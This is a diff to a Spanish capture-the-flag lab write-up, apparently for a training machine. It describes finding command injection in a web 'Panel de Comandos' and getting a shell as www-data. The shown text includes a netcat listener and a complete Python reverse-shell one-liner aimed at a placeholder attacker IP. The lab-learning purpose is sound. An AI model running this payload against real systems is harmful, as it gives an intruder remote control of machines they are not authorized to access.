@@ -83,7 +83,8 @@ Al introducir estas credenciales, logré acceder al sistema, lo que marca el fin
 
 Una vez con las credenciales, inicié sesión en la página **`/login.php`** y fui redirigido a una nueva sección: **`portal.php`**. Esta página presentaba un "Panel de Comandos" con un campo de texto para ejecutar comandos.
 
-\!
+![alt](images/3.png)
+
 Esta interfaz sugería una vulnerabilidad de **inyección de comandos**. Para confirmar esto y obtener acceso al sistema, decidí ejecutar una **reverse shell**.
 
   * **Reverse Shell:** Usando una *reverse shell*, un atacante puede hacer que la máquina víctima se conecte a la suya, dándole un control completo sobre el sistema.
@@ -96,10 +97,11 @@ nc -lvnp 4444
 
 Luego, en el "Panel de Comandos" de la máquina víctima, ejecuté un *payload* de *reverse shell* de Python.
 
+**⚠️ Aclaración:** Es crucial que modifiques el comando de la *reverse shell* para reemplazar `<TU_IP_ATACANTE>` con la dirección IP de tu máquina. En este tipo de ejercicios, a menudo se usa la IP de la interfaz **`tun0`**.
+
 ```bash
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TU_IP_ATACANTE>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
 ```
-
+![alt](images/4.png)
 Después de ejecutar el comando, recibí una conexión en mi *listener* de `netcat`, lo que me dio una *shell* con el usuario **`www-data`**. Ahora, el objetivo es encontrar los tres ingredientes y, finalmente, escalar privilegios para obtener el control total.
-
-      
+![alt](images/5.png)
